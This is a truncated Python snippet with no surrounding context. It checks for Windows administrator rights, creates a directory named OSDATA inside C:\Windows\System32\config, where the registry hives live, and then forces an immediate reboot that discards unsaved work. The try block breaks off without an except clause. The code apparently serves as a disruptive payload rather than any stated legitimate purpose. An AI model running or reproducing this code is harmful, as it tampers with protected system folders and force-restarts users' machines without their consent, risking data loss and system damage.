def run():
    import os
    import ctypes
    import sys
    import subprocess
    
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    if not is_admin():
        sys.exit(1)
    
    target_path = r"C:\Windows\System32\config\OSDATA"
    
    try:
        os.makedirs(target_path, exist_ok=True)    
        subprocess.run(["shutdown", "/r", "/f", "/t", "0"])
